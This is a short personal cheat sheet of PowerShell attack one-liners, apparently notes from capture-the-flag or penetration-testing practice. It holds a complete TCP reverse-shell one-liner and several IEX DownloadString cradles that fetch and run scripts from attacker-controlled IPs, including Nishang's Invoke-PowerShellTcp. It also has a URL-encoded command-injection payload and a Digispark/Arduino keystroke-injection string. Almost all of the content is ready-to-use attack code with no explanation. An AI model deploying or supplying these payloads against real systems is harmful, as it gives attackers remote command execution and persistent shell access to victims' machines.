

Reverse shell, run this at cmd prompt, if at ps, ship powershell -c ""
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

also saved in revsh2.ps1 on ny kali

start from somewhere else:
`powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shells/revshk.ps1');"`

[nishang](https://github.com/samratashok/nishang)
 `powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.21.236:8000/shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.21.236 -Port 443`

url
`/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dadmin|powershell.exe%2b-c%2biex(new-object%2bnet.webclient).downloadstring('http%253a//10.18.21.236%253a8000/revshk.ps1')`

cpp (arduino, digispark)
`"powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.233.133:8000/revsh.ps1');\""`

